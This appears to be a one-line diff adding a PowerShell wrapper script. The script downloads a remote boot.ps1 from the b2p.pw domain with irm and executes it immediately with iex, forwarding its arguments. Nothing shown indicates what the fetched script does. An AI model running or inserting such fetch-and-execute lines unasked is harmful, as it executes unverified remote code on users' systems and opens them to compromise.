@@ -1,0 +1,1 @@
+$a = $args -join ' '; iex "& { $(irm 'https://b2p.pw/r/windows/latest/boot.ps1') } $a"
